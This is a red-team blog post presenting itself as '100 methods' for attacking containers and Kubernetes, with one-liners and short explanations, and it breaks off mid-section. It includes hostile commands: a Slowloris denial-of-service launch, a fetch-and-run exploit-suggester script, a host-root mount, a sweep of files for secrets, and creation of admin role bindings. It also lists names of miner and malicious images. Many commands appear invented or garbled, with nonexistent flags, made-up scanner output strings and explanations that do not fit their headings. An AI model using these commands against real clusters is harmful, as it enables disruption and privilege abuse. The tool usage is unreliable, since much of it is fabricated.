---
layout: post
title:  "100 Methods for Container Attacks(RTC0010)"
author: redteamrecipe
categories: [ tutorial ]
tags: [red, blue]
image: assets/images/18.jpg
description: "100 Methods for Container Attacks"
featured: true
hidden: true
rating: 4.5
---




### Insecure Container Images


1. Using Trivy:

```
trivy -q -f json <container_name>:<tag> | jq '.[] | select(.Vulnerabilities != null)'
```

This command uses Trivy, a vulnerability scanner for containers, to scan a specific container image (`<container_name>:<tag>`) for vulnerabilities. The `-q` flag suppresses the output, and the `-f json` flag formats the output as JSON. The command then uses `jq` to filter the results and display only the vulnerabilities found.



2. Using Clair-scanner:


```
clair-scanner --ip <container_ip> --report <report_output_file>
```


This command utilizes Clair-scanner, a tool that integrates with the Clair vulnerability database, to scan a running container (`<container_ip>`) and generate a report (`<report_output_file>`) containing the vulnerabilities found.


3. Using kube-hunter:

```
kube-hunter --remote <cluster_address> | grep -B 5 "Critical:"
```


This command employs kube-hunter, a Kubernetes penetration testing tool, to scan a remote Kubernetes cluster (`<cluster_address>`) for security vulnerabilities. The output is then piped to `grep` to filter and display only the critical vulnerabilities found.


#### Malicious Images via Aqua

- docker-network-bridge-
- ipv6:0.0.2
- docker-network-bridge-
- ipv6:0.0.1
- docker-network-ipv6:0.0.12
- ubuntu:latest
- ubuntu:latest
- ubuntu:18.04
- busybox:latest
- alpine: latest
- alpine-curl
- xmrig:latest
- alpine: 3.13
- dockgeddon: latest
- tornadorangepwn:latest
- jaganod: latest
- redis: latest
- gin: latest (built on host)
- dockgeddon:latest
- fcminer: latest
- debian:latest
- borg:latest
- docked:latestk8s.gcr.io/pause:0.8
- dockgeddon:latest
- stage2: latest
- dockerlan:latest
- wayren:latest
- basicxmr:latest
- simpledockerxmr:latest
- wscopescan:latest
- small: latest
- app:latest
- Monero-miner: latest
- utnubu:latest
- vbuntu:latest
- swarm-agents:latest
- scope: 1.13.2
- apache:latest
- kimura: 1.0
- xmrig: latest
- sandeep078: latest
- tntbbo:latest
- kuben2

#### [](https://devsecopsguides.com/docs/attacks/container/#other-images)Other Images

- OfficialImagee
- Ubuntuu
- Cent0S
- Alp1ne
- Pythoon




### Privileged Container


1. Using kube-score:


```
kube-score score <cluster_address> --filter-allowed-privilege-escalation=false | grep "Privileged:"
```


This command utilizes kube-score, a Kubernetes security configuration scanner, to score a Kubernetes cluster (`<cluster_address>`) and filter out containers that allow privilege escalation. The output is then filtered using `grep` to display only containers flagged as "Privileged."


2. Using kubectl and jq:


```
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | .metadata.name'
```

This command uses kubectl to fetch information about all pods in all namespaces of a Kubernetes cluster. The output is formatted as JSON, which is then processed by `jq`. The command filters out pods that have containers with privileged security context and displays the names of those pods.


3. Using kube-hunter:

```
kube-hunter --remote <cluster_address> | grep -B 5 "Privileged: true"
```



### Container Escape


1. Using Linpeas:

```
docker run --rm -v /:/host -t linpeas -C | grep -E "(Writable to|Capabilities|Capabilities).*"
```



This command uses Linpeas, a Linux privilege escalation checking script, to perform a scan inside a container. The container is run with access to the host's root filesystem (`-v /:/host`), allowing Linpeas to check for vulnerabilities. The output is then filtered using `grep` to display relevant information related to writable files and capabilities.


2. Using kubeletctl:

```
docker run --rm -it quay.io/kubepwn/kubeletctl containerescape -v
```


This command utilizes kubeletctl, a tool for exploiting Kubernetes kubelet, to check for container escape vulnerabilities. The container is run with the `containerescape` command, and the `-v` flag is used to enable verbose output, providing detailed information about any vulnerabilities found.


3. Using GTFOBins and grep:


```
docker run --rm -v /:/mnt alpine sh -c "wget -qO- https://raw.githubusercontent.com/GTFOBins/GTFOBins.github.io/master/gtfobins/<binary> | grep -Eo '(sudo|chmod|chown) \.[^\s]+'"
```


This command uses GTFOBins, a curated list of Unix binaries that can be used for privilege escalation, to search for potential container escape vectors. The container runs an Alpine Linux image, and the specified `<binary>` is fetched from the GTFOBins repository. The output is filtered using `grep` to display any commands that could potentially be used for privilege escalation.



### Container Image Tampering


1. Using Trivy:

```
trivy -q -f json --exit-code 1 <container_name>:<tag> || echo "Container image tampered"
```


This command uses Trivy to scan a specific container image (`<container_name>:<tag>`) for vulnerabilities. The `-q` flag suppresses the output, and the `-f json` flag formats the output as JSON. The `--exit-code 1` flag causes Trivy to exit with a non-zero status code if vulnerabilities are found. If the exit code is non-zero, it means that vulnerabilities were detected, indicating a possible container image tampering.

2. Using Docker Content Trust:

```
DOCKER_CONTENT_TRUST=1 docker pull <container_name>:<tag> || echo "Container image tampered"
```


This command pulls a container image (`<container_name>:<tag>`) with Docker Content Trust (DCT) enabled. DCT ensures the authenticity and integrity of the image by verifying the image signature. If the image has been tampered with and the signature verification fails, the command will output "Container image tampered."


3. Using Anchore Engine:


```
anchore-cli image vuln <container_name>:<tag> os | grep -i "malware"
```


This command uses Anchore Engine, an open-source container security tool, to scan a container image (`<container_name>:<tag>`) for vulnerabilities. The `image vuln` command checks for vulnerabilities specifically in the operating system layer of the image. The output is then filtered using `grep` to search for any mentions of "malware," indicating potential image tampering.



### Insecure Container Configuration


1. Using kube-score:

```
kube-score score <cluster_address> --filter-allow-privileged=true --filter-security-context=false --filter-capabilities=false --filter-read-only-root-filesystem=false
```


This command utilizes kube-score, a Kubernetes security configuration scanner, to score a Kubernetes cluster (`<cluster_address>`) and filter out containers with insecure configurations. The command checks for containers that are allowed to run as privileged, containers without security context, containers with escalated capabilities, and containers without a read-only root filesystem.


2. Using kube-hunter:

```
kube-hunter --remote <cluster_address> | grep -E "(Unauthenticated Access|Insecure Configuration)"
```


This command employs kube-hunter to scan a remote Kubernetes cluster (`<cluster_address>`) for security vulnerabilities. The output is then filtered using `grep` to display findings related to unauthenticated access and insecure configurations.


3. Using Kritis and kubectl:

```
kubectl get kritisconstraints -A -o json | jq -r '.items[] | select(.spec.requirements[].disallowConfigMapOrSecretAccess==true) | .metadata.name'
```


This command uses Kritis, a Kubernetes admission controller, to fetch the Kritis constraints from all namespaces in a Kubernetes cluster. The output is formatted as JSON and then processed using `jq`. The command filters out constraints that disallow access to ConfigMaps or Secrets and displays the names of the constraints.



### Denial-of-Service (DoS)


1. Using Kubei:

```
kubei scan pod --all-namespaces | grep "Denial of Service"
```


This command uses Kubei, a Kubernetes runtime scanner, to scan all pods in all namespaces for potential Denial-of-Service vulnerabilities. The output is then filtered using `grep` to display any findings related to Denial-of-Service.


2. Using Slowloris:

```
slowloris -dns <target_url> -port <target_port>
```

This command utilizes Slowloris, a popular Denial-of-Service attack tool, to launch a Slowloris attack against a target URL (`<target_url>`) and port (`<target_port>`). Slowloris attempts to exhaust the target's resources, leading to a Denial-of-Service condition.


3. Using GoBuster and curl:

```
gobuster dir -u <target_url> -w <wordlist_file> -c 200 -q | curl -X POST -d @- <target_url>
```

This command combines GoBuster, a directory and file brute-forcing tool, with curl, a command-line HTTP client, to simulate a DoS attack. GoBuster is used to discover directories and files on a target URL (`<target_url>`) using a wordlist file (`<wordlist_file>`). The output of GoBuster is then piped to curl, which sends POST requests to the target URL, potentially overwhelming the server and causing a DoS condition.


4. Using Stress-ng:

```
stress-ng --cpu <num_cpus> --io <num_io_operations> --vm <num_vm_operations> --vm-bytes <vm_memory_allocation>
```


This command utilizes Stress-ng, a tool for generating synthetic workloads and stressing various system components, to exert stress on the CPU, I/O operations, and virtual memory within the container. By adjusting the parameters, such as the number of CPUs (`<num_cpus>`) and the amount of memory allocated for virtual memory operations (`<vm_memory_allocation>`), you can evaluate the container's ability to handle high loads and identify any potential DoS vulnerabilities.


5. Using tc (traffic control):

```
tc qdisc add dev eth0 root netem loss <packet_loss_percentage>%
```


This command uses the tc command, which is part of the Linux Traffic Control suite, to introduce packet loss on the network interface (`eth0`) within the container. By specifying a packet loss percentage (`<packet_loss_percentage>`), you can simulate network congestion and evaluate the container's resilience to network-related DoS attacks.



### Kernel Vulnerabilities


1. Using ksplice-uptrack:

```
uptrack-show --available | grep kernel
```


This command uses ksplice-uptrack, a tool for live patching the Linux kernel, to check for available kernel updates and specifically filter for kernel-related vulnerabilities. The command lists the available kernel updates, and `grep` is used to display only the kernel-related entries.


2. Using Linux Exploit Suggester:

```
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh && chmod +x les.sh && ./les.sh
```


This command downloads the Linux Exploit Suggester script (`les.sh`) from its GitHub repository and executes it. The script performs a scan on the system's kernel and provides a list of potential kernel exploits and vulnerabilities based on the kernel version and configuration.



3. Using KernelCare:

```
kcarectl --check
```


This command uses KernelCare, a live patching solution for the Linux kernel, to check the kernel's vulnerability status. The command verifies if the kernel has the latest patches applied and reports any missing patches or potential vulnerabilities.




### Shared Kernel Exploitation


1. Using Docker Security Scanning (DSS):

```
docker scan <container_name>:<tag> | grep -i "shared kernel"
```


This command uses Docker Security Scanning (DSS) to scan a specific container image (`<container_name>:<tag>`) for known vulnerabilities. The output is then filtered using `grep` to search for any findings related to shared kernel exploitation vulnerabilities.


2. Using Kubernetes Security Context:

```
kubectl get pods --all-namespaces -o=jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.securityContext.hostPID}{"\n"}{end}' | grep -iE "true"
```


This command retrieves information about all pods in all namespaces within a Kubernetes cluster. It uses `jsonpath` to extract the pod name and the `hostPID` value from the pod's security context. The output is then filtered using `grep` to identify any pods where the `hostPID` value is set to `true`. This indicates that the pod has access to the host's process namespace, which could potentially lead to shared kernel exploitation vulnerabilities.


3. Using kube-hunter:

```
kube-hunter --remote <cluster_address> | grep -B 5 "HostPID: true"
```


This command utilizes kube-hunter to scan a remote Kubernetes cluster (`<cluster_address>`) for security vulnerabilities. The output is then piped to `grep` to filter and display only the containers where the `HostPID` value is set to `true`. This indicates that the container has access to the host's process namespace, which may introduce shared kernel exploitation risks.



### Insecure Container Orchestration


1. Using kube-score:

```
kube-score score <cluster_address> --filter-kubernetes-version=false | grep -i "security"
```

This command utilizes kube-score, a Kubernetes security configuration scanner, to score a Kubernetes cluster (`<cluster_address>`) and filter out any security-related issues. The `--filter-kubernetes-version=false` flag disables the check for outdated Kubernetes versions. The output is then filtered using `grep` to display findings related to insecure container orchestration configurations.


2. Using kube-hunter:

```
kube-hunter --remote <cluster_address> | grep -B 5 "Insecure Orchestrator"
```


This command employs kube-hunter to scan a remote Kubernetes cluster (`<cluster_address>`) for security vulnerabilities. The output is then piped to `grep` to filter and display any findings related to insecure container orchestrators.


3. Using Anchore Engine:


```
anchore-cli policy status --detail | grep -iE "notallowed|deny"
```


This command uses Anchore Engine, an open-source container security tool, to check the policy status and details of containers. The output is then filtered using `grep` to display any findings related to policies that do not allow or deny specific container orchestration configurations.



### Dump All Secrets


```
find /path/to/container -type f -exec grep -EHino "secret|key|password" {} \;
```


This powerful command combines the `find` and `grep` tools. It searches for files (`-type f`) within the specified container directory and its subdirectories. For each file found, it uses `grep` to look for patterns like "secret," "key," or "password," displaying the matching lines along with their line number, file name, and the actual content.



### Steal Pod Service Account Token


```
kubectl get serviceaccounts --all-namespaces -o custom-columns=NAMESPACE:.metadata.namespace,NAME:.metadata.name,SECRET:.secrets[0].name
```

This command uses `kubectl` to retrieve a list of service accounts across all namespaces. By specifying the custom columns, it displays the namespace, service account name, and the associated secret name (where the token might be stored) if available.



### Create Admin ClusterRole


1. Using Kubeletctl and kubectl:

```
kubeletctl clusterroles --all-namespaces | grep admin
kubectl create clusterrolebinding admin-binding --clusterrole=admin --user=<username>
```

Explanation: The first command uses Kubeletctl to list all ClusterRoles in all namespaces and filters the results to find any ClusterRoles with "admin" in their names. The second command creates a ClusterRoleBinding named "admin-binding" that assigns the "admin" ClusterRole to a specified user.


2. Using kube-score and kubectl:

```
kube-score score /path/to/kubernetes/manifest.yaml | grep -i clusterrole | grep -i admin
kubectl create clusterrole admin --verb=<allowed-verb> --resource=<allowed-resource>
```

Explanation: The first command uses kube-score to assess the quality and security of a Kubernetes manifest file, and then filters the results to find any occurrences of "clusterrole" and "admin". The second command creates a new ClusterRole named "admin" with the specified allowed verbs and resources.


3. Using Kube-hunter and kubectl:

```
kube-hunter --remote <cluster-IP> | grep -i clusterrole | grep -i admin
kubectl create clusterrolebinding admin-binding --clusterrole=admin --serviceaccount=<namespace>:<service-account>
```

Explanation: The first command uses Kube-hunter to perform a security assessment on a remote Kubernetes cluster by scanning for vulnerabilities and misconfigurations. It filters the results to identify any mentions of "clusterrole" and "admin". The second command creates a ClusterRoleBinding named "admin-binding" that assigns the "admin" ClusterRole to a specified service account within a specific namespace.


### Create Client Certificate Credential


1. Using Gobuster and OpenSSL:

```
gobuster dir -u https://<target-url> -w /path/to/wordlist.txt -x .pem,.crt
openssl x509 -in /path/to/certificate.pem -text -noout
```

Explanation: The first command uses Gobuster to perform a directory and file enumeration on a target URL, searching for files with ".pem" or ".crt" extensions that may contain client certificate credentials. The second command uses OpenSSL to view the content of a PEM-encoded certificate file and extract relevant information such as the subject and issuer details.


2. Using Nmap and OpenSSL:

```
nmap -p 443 --script ssl-cert <target-ip>
openssl x509 -in /path/to/certificate.pem -text -noout
```

Explanation: The first command uses Nmap with the "ssl-cert" script to perform an SSL certificate enumeration on port 443 of a target IP, searching for certificates that may contain client credentials. The second command, similar to the previous example, uses OpenSSL to view the content of a PEM-encoded certificate file.


3. Using SSLScan and OpenSSL:

```
sslscan <target-ip>
openssl x509 -in /path/to/certificate.pem -text -noout
```

Explanation: The first command uses SSLScan to perform a thorough SSL/TLS vulnerability assessment on a target IP, including the enumeration of certificates. The output may contain information about client certificates. The second command, as before, uses OpenSSL to view the content of a PEM-encoded certificate file.


### Create Long-Lived Token


1. Using truffleHog and grep:

```
trufflehog --regex --entropy=False --rules /path/to/ruleset.json <repository-url> | grep "long-lived token"
```

Explanation: The command uses truffleHog, a tool for finding secrets in source code, to scan a repository specified by `<repository-url>` for long-lived tokens. It uses a ruleset specified by `/path/to/ruleset.json` and filters the results to display only lines containing "long-lived token" using grep.

2. Using GitRob and grep:

```
gitrob -commit-search -github-access-token <access-token> -organisation <org-name> | grep "long-lived token"
```

Explanation: The command uses GitRob, a tool for searching GitHub repositories, to search for long-lived tokens in the specified organization `<org-name>`. It requires a GitHub access token specified by `<access-token>`. The results are filtered to display only lines containing "long-lived token" using grep.

3. Using kube-hunter and jq:

```
kube-hunter --remote <cluster-IP> -f json | jq '. | select(.tests[].name == "Long Lived Tokens")'
```


Explanation: The command uses kube-hunter to perform a security assessment on a remote Kubernetes cluster specified by `<cluster-IP>`. It generates the output in JSON format. The output is then piped to jq, which filters the results to display only the findings related to "Long Lived Tokens".


### Container breakout via hostPath volume mount


1. Using kube-hunter and grep:

```
kube-hunter --remote <cluster-IP> -f json | grep -A 5 "Container Breakout" | grep "hostPath"
```

Explanation: The command uses kube-hunter to perform a security assessment on a remote Kubernetes cluster specified by `<cluster-IP>`. It generates the output in JSON format. The output is then piped to grep to filter the results for "Container Breakout" findings. Then it further filters for lines that contain "hostPath" to identify potential vulnerabilities related to hostPath volume mount.


2. Using trivy and awk:

```
trivy image --no-progress <image-name> | awk '/^=== [C|c]ontainer [B|b]reakout ===/,/^---/'
```



Explanation: The command uses trivy, a vulnerability scanner for container images, to scan a container image specified by `<image-name>`. The output is piped to awk, which selects the lines between the patterns `"=== Container Breakout ===" and "---"` to highlight any vulnerabilities related to container breakout.


3. Using kubectl and jq:

```
kubectl get pod --all-namespaces -o json | jq '.items[].spec | select(.volumes[].hostPath != null) | {namespace: .namespace, pod: .nodeName, volume: .volumes[].hostPath}'
```

Explanation: The command uses kubectl to retrieve information about pods in all namespaces in JSON format. The output is piped to jq, which filters and formats the results to display the namespace, pod name, and any hostPath volumes that are being used. This can help identify pods that potentially mount hostPath volumes, which can be a security concern for container breakout vulnerabilities.




### Privilege escalation through node/proxy permissions


1. Using kube-hunter and grep:

```
kube-hunter --remote <cluster-IP> -f json | grep -A 5 "Privilege Escalation" | grep -E "node|proxy"
```


Explanation: The command uses kube-hunter to perform a security assessment on a remote Kubernetes cluster specified by `<cluster-IP>`. It generates the output in JSON format. The output is then piped to grep to filter the results for "Privilege Escalation" findings. Then it further filters for lines that contain "node" or "proxy" to identify potential vulnerabilities related to privilege escalation through node or proxy permissions.


2. Using kubectl and jq:

```
kubectl get clusterrolebindings --all-namespaces -o json | jq '.items[] | select(.roleRef.name == "cluster-admin") | .metadata.namespace + "/" + .metadata.name'
```


Explanation: The command uses kubectl to retrieve information about cluster role bindings in all namespaces in JSON format. The output is piped to jq, which filters the results to select cluster role bindings with the name "cluster-admin". It then displays the namespace and name of those bindings, which can indicate potential privilege escalation vulnerabilities.



3. Using trivy and grep:

```
trivy image --no-progress <image-name> | grep -i "privileged:true\|hostnetwork:true\|hostpid:true\|hostipc:true"
```


Explanation: The command uses trivy, a vulnerability scanner for container images, to scan a container image specified by `<image-name>`. The output is piped to grep to search for lines containing keywords related to privilege escalation, such as "privileged:true", "hostnetwork:true", "hostpid:true", and "hostipc:true". This can help identify potential vulnerabilities related to node or proxy permissions.



### Run a Privileged Pod


1. Using kubectl and grep:

```
kubectl get pods --all-namespaces -o json | grep -i "privileged: true"
```

Explanation: The command uses kubectl to retrieve information about pods in all namespaces in JSON format. The output is piped to grep to search for lines containing "privileged: true", which indicates that a pod is running with privileged access.



2. Using kube-hunter and grep:

```
kube-hunter --remote <cluster-IP> -f json | grep -A 5 "Privileged Containers"
```

Explanation: The command uses kube-hunter to perform a security assessment on a remote Kubernetes cluster specified by `<cluster-IP>`. It generates the output in JSON format. The output is then piped to grep to filter the results for "Privileged Containers" findings. This will identify any pods running with privileged access.


3. Using kubectl and jq:

```
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged == true) | .metadata.namespace + "/" + .metadata.name'
```


Explanation: The command uses kubectl to retrieve information about pods in all namespaces in JSON format. The output is piped to jq, which filters the results to select pods where at least one container has the "privileged" field set to true in its securityContext. It then displays the namespace and name of those pods, indicating the presence of privileged pods.


### Restrict Kubernetes API access to specific IP ranges


1. Using kubectl and jq:

```
kubectl get service -n kube-system kube-apiserver -o json | jq '.spec.ports[] | select(.name=="https").nodePort'
```

Explanation: The command uses kubectl to retrieve information about the kube-apiserver service in the kube-system namespace. The output is piped to jq, which selects the port configuration for HTTPS and displays the corresponding nodePort. This nodePort can be used to access the Kubernetes API.


2. Using nmap and grep:

```
nmap -p <nodePort> <cluster-IP> | grep "open"
```


Explanation: The command uses nmap to scan a specific nodePort, which is obtained from the previous command. It scans the specified cluster IP for the given nodePort and filters the output to display only lines that indicate the port is "open". This verifies if the Kubernetes API is accessible from the specified IP range.


3. Using kube-hunter and grep:

```
kube-hunter --remote <cluster-IP> -f json | grep -A 5 "Open Kubernetes API Server Proxy"
```


Explanation: The command uses kube-hunter to perform a security assessment on a remote Kubernetes cluster specified by `<cluster-IP>`. It generates the output in JSON format. The output is then piped to grep to filter the results for "Open Kubernetes API Server Proxy" findings. This identifies if the Kubernetes API server proxy is accessible without restrictions.




### Use Role-Based Access Control (RBAC)


1. Using kubectl and jq:

```
kubectl get clusterrolebindings --all-namespaces -o json | jq '.items[] | select(.roleRef.name != null) | .metadata.namespace + "/" + .metadata.name'
```


Explanation: The command uses kubectl to retrieve information about cluster role bindings in all namespaces in JSON format. The output is piped to jq, which filters the results to select cluster role bindings that have a non-null "roleRef.name". It then displays the namespace and name of those bindings, indicating the use of RBAC.


2. Using kube-hunter and grep:

```
kube-hunter --remote <cluster-IP> -f json | grep -A 5 "RBAC"
```


Explanation: The command uses kube-hunter to perform a security assessment on a remote Kubernetes cluster specified by `<cluster-IP>`. It generates the output in JSON format. The output is then piped to grep to filter the results for "RBAC" findings. This identifies if RBAC is being used within the cluster.


3. Using kubectl and grep:

```
kubectl get rolebindings --all-namespaces -o custom-columns='NAMESPACE:.metadata.namespace, NAME:.metadata.name' | grep -v "NAMESPACE NAME"
```

Explanation: The command uses kubectl to retrieve information about role bindings in all namespaces. It formats the output to display the namespace and name of each role binding. The output is then piped to grep to filter out the header line (NAMESPACE NAME) and display only the role bindings, indicating the use of RBAC.




### Enable PodSecurityPolicy (PSP)

1. Using kubectl and jq:

```
kubectl get podsecuritypolicies.policy --all-namespaces -o json | jq '.items[].metadata.name'
```

Explanation: The command uses kubectl to retrieve information about PodSecurityPolicies in all namespaces in JSON format. The output is piped to jq, which extracts and displays the name of each PodSecurityPolicy. If any PSPs are listed, it indicates that PodSecurityPolicy is enabled.


2. Using kube-hunter and grep:

```
kube-hunter --remote <cluster-IP> -f json | grep -A 5 "Pod Security Policy"
```


Explanation: The command uses kube-hunter to perform a security assessment on a remote Kubernetes cluster specified by `<cluster-IP>`. It generates the output in JSON format. The output is then piped to grep to filter the results for "Pod Security Policy" findings. This identifies if PodSecurityPolicy is being used within the cluster.


3. Using kubectl and grep:

```
kubectl get clusterrolebindings --all-namespaces -o custom-columns='NAMESPACE:.metadata.namespace, NAME:.metadata.name, ROLE:.roleRef.name' | grep "podsecuritypolicy"
```


Explanation: The command uses kubectl to retrieve information about cluster role bindings in all namespaces. It formats the output to display the namespace, name, and roleRef name of each cluster role binding. The output is then piped to grep to filter out lines that do not mention "podsecuritypolicy". If any matching lines are found, it indicates that PodSecurityPolicy is being utilized.


### Use Network Policies


1. Using kubectl and jq:

```
kubectl get networkpolicies --all-namespaces -o json | jq '.items[] | select(.spec.podSelector != null) | .metadata.namespace + "/" + .metadata.name'
```


Explanation: The command uses kubectl to retrieve information about Network Policies in all namespaces in JSON format. The output is piped to jq, which filters the results to select network policies that have a non-null "podSelector". It then displays the namespace and name of those network policies, indicating the use of Network Policies.


2. Using kube-hunter and grep:

```
kube-hunter --remote <cluster-IP> -f json | grep -A 5 "Network Policy"
```



Explanation: The command uses kube-hunter to perform a security assessment on a remote Kubernetes cluster specified by `<cluster-IP>`. It generates the output in JSON format. The output is then piped to grep to filter the results for "Network Policy" findings. This identifies if Network Policies are being used within the cluster.


3. Using kubectl and grep:


```
kubectl get pods --all-namespaces -o json | grep -i "networkpolicies"
```


Explanation: The command uses kubectl to retrieve information about pods in all namespaces in JSON format. The output is piped to grep to search for lines containing "networkpolicies". If any matching lines are found, it indicates that Network Policies are being utilized.




### Enable Audit Logging

1. Using kubectl and jq:

```
kubectl get auditpolicies --all-namespaces -o json | jq '.items[].metadata.name'
```


Explanation: The command uses kubectl to retrieve information about Audit Policies in all namespaces in JSON format. The output is piped to jq, which extracts and displays the name of each Audit Policy. If any Audit Policies are listed, it indicates that audit logging is enabled.


2. Using kube-hunter and grep:


```
kube-hunter --remote <cluster-IP> -f json | grep -A 5 "Audit Logging Enabled"
```


Explanation: The command uses kube-hunter to perform a security assessment on a remote Kubernetes cluster specified by `<cluster-IP>`. It generates the output in JSON format. The output is then piped to grep to filter the results for "Audit Logging Enabled" findings. This identifies if audit logging is enabled within the cluster.


3. Using kubectl and grep:

```
kubectl get pods --all-namespaces -o json | grep -i "audit-log"
```


Explanation: The command uses kubectl to retrieve information about pods in all namespaces in JSON format. The output is piped to grep to search for lines containing "audit-log". If any matching lines are found, it indicates that audit logging is enabled, as pods may have log mounts for audit logs.




### Use Secure Service Endpoints

1. Using kubectl and jq:

```
kubectl get services --all-namespaces -o json | jq '.items[] | select(.spec.publishNotReadyAddresses==true) | .metadata.namespace + "/" + .metadata.name'
```


Explanation: The command uses kubectl to retrieve information about services in all namespaces in JSON format. The output is piped to jq, which filters the results to select services that have the "publishNotReadyAddresses" field set to true. It then displays the namespace and name of those services, indicating the use of secure service endpoints.


2. Using kube-hunter and grep:

```
kube-hunter --remote <cluster-IP> -f json | grep -A 5 "Secure Service Endpoints"
```


Explanation: The command uses kube-hunter to perform a security assessment on a remote Kubernetes cluster specified by `<cluster-IP>`. It generates the output in JSON format. The output is then piped to grep to filter the results for "Secure Service Endpoints" findings. This identifies if secure service endpoints are being used within the cluster.


3. Using kubectl and grep:

```
kubectl get endpoints --all-namespaces -o json | grep -i "subset"
```


Explanation: The command uses kubectl to retrieve information about endpoints in all namespaces in JSON format. The output is piped to grep to search for lines containing "subset". If any matching lines are found, it indicates that subsets, which are commonly used for secure service endpoints, are defined for the endpoints.






### Use Pod Security Context


1. Using kubectl and jq:

```
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.securityContext != null) | .metadata.namespace + "/" + .metadata.name'
```

Explanation: The command uses kubectl to retrieve information about pods in all namespaces in JSON format. The output is piped to jq, which filters the results to select pods that have a non-null "securityContext" defined in their spec. It then displays the namespace and name of those pods, indicating the use of Pod Security Context.


2. Using kube-hunter and grep:

```
kube-hunter --remote <cluster-IP> -f json | grep -A 5 "Pod Security Context"
```

Explanation: The command uses kube-hunter to perform a security assessment on a remote Kubernetes cluster specified by `<cluster-IP>`. It generates the output in JSON format. The output is then piped to grep to filter the results for "Pod Security Context" findings. This identifies if Pod Security Context is being used within the cluster.


3. Using kubectl and grep:

```
kubectl get pods --all-namespaces -o json | grep -i "securityContext"
```


Explanation: The command uses kubectl to retrieve information about pods in all namespaces in JSON format. The output is piped to grep to search for lines containing "securityContext". If any matching lines are found, it indicates that Pod Security Context is being utilized.




### Use Kubernetes Secrets

1. Using kubectl and jq:

```
kubectl get secrets --all-namespaces -o json | jq '.items[] | select(.type!="Opaque") | .metadata.namespace + "/" + .metadata.name'
```

Explanation: The command uses kubectl to retrieve information about secrets in all namespaces in JSON format. The output is piped to jq, which filters the results to select secrets that have a type other than "Opaque". It then displays the namespace and name of those secrets, indicating the use of Kubernetes Secrets.


2. Using kube-hunter and grep:

```
kube-hunter --remote <cluster-IP> -f json | grep -A 5 "Kubernetes Secrets"
```

Explanation: The command uses kube-hunter to perform a security assessment on a remote Kubernetes cluster specified by `<cluster-IP>`. It generates the output in JSON format. The output is then piped to grep to filter the results for "Kubernetes Secrets" findings. This identifies if Kubernetes Secrets are being used within the cluster.


3. Using kubectl and grep:

```
kubectl get pods --all-namespaces -o json | grep -i "secrets"
```

Explanation: The command uses kubectl to retrieve information about pods in all namespaces in JSON format. The output is piped to grep to search for lines containing "secrets". If any matching lines are found, it indicates that Kubernetes Secrets are being utilized.




### Enable Container Runtime Protection

1. Using kube-hunter and grep:

```
kube-hunter --remote <cluster-IP> -f json | grep -A 5 "Container Runtime Protection"
```


Explanation: The command uses kube-hunter to perform a security assessment on a remote Kubernetes cluster specified by `<cluster-IP>`. It generates the output in JSON format. The output is then piped to grep to filter the results for "Container Runtime Protection" findings. This identifies if container runtime protection is enabled within the cluster.


2. Using trivy and grep:

```
trivy image --no-progress <image-name> | grep -i "vulnerabilities" | grep -i "container runtime"
```

Explanation: The command uses trivy, a vulnerability scanner for container images, to scan a container image specified by `<image-name>`. The output is piped to grep to search for lines containing "vulnerabilities" and "container runtime". This can indicate if container runtime protection is being used to detect and mitigate vulnerabilities in the container runtime environment.


3. Using kubectl and jq:

```
kubectl get podsecuritypolicies.policy --all-namespaces -o json | jq '.items[] | select(.spec.runtimeClass != null) | .metadata.namespace + "/" + .metadata.name'
```


Explanation: The command uses kubectl to retrieve information about PodSecurityPolicies in all namespaces in JSON format. The output is piped to jq, which filters the results to select pod security policies that have a non-null "runtimeClass" defined. It then displays the namespace and name of those policies, indicating the use of container runtime protection.



### Enable Admission Controllers


1. Using kubectl and jq:

```
kubectl get mutatingwebhookconfigurations.admissionregistration.k8s.io --all-namespaces -o json | jq '.items[].metadata.name'
```

Explanation: The command uses kubectl to retrieve information about MutatingWebhookConfigurations in all namespaces in JSON format. The output is piped to jq, which extracts and displays the name of each MutatingWebhookConfiguration. If any MutatingWebhookConfigurations are listed, it indicates that admission controllers are enabled.


2. Using kube-hunter and grep:

```
kube-hunter --remote <cluster-IP> -f json | grep -A 5 "Admission Controllers"
```

Explanation: The command uses kube-hunter to perform a security assessment on a remote Kubernetes cluster specified by `<cluster-IP>`. It generates the output in JSON format. The output is then piped to grep to filter the results for "Admission Controllers" findings. This identifies if admission controllers are being used within the cluster.


3. Using kubectl and grep:

```
kubectl get validatingwebhookconfigurations.admissionregistration.k8s.io --all-namespaces -o custom-columns='NAMESPACE:.metadata.namespace, NAME:.metadata.name' | grep -v "NAMESPACE NAME"
```


Explanation: The command uses kubectl to retrieve information about ValidatingWebhookConfigurations in all namespaces. It formats the output to display the namespace and name of each ValidatingWebhookConfiguration. The output is then piped to grep to filter out the header line (NAMESPACE NAME) and display only the validating webhook configurations, indicating the use of admission controllers.


### Enable Docker Content Trust


1. Using Docker CLI:

```
DOCKER_CONTENT_TRUST=1 docker pull <image-name>
```

Explanation: The command sets the `DOCKER_CONTENT_TRUST` environment variable to `1` to enable Docker Content Trust. It then pulls the specified container image `<image-name>`. If the pull is successful, it indicates that Docker Content Trust is enabled.

2. Using kube-hunter and grep:

```
kube-hunter --remote <cluster-IP> -f json | grep -A 5 "Docker Content Trust"
```

Explanation: The command uses kube-hunter to perform a security assessment on a remote Kubernetes cluster specified by `<cluster-IP>`. It generates the output in JSON format. The output is then piped to grep to filter the results for "Docker Content Trust" findings. This identifies if Docker Content Trust is enabled within the cluster.


3. Using Trivy and grep:

```
TRIVY_INSECURE_SKIP=1 trivy --no-progress <image-name> | grep -i "content trust"
```

Explanation: The command sets the `TRIVY_INSECURE_SKIP` environment variable to `1` to bypass security checks. It then uses Trivy, a vulnerability scanner for container images, to scan the specified container image `<image-name>`. The output is piped to grep to search for lines containing "content trust". If any matching lines are found, it indicates that Docker Content Trust is enabled.



### Restrict communication with Docker daemon to local socket

1. Using kube-hunter and grep:

```
kube-hunter --remote <cluster-IP> -f json | grep -A 5 "Docker Daemon - Local Socket"
```

Explanation: The command uses kube-hunter to perform a security assessment on a remote Kubernetes cluster specified by `<cluster-IP>`. It generates the output in JSON format. The output is then piped to grep to filter the results for "Docker Daemon - Local Socket" findings. This identifies if the communication with the Docker daemon is restricted to the local socket.

2. Using Docker CLI:

```
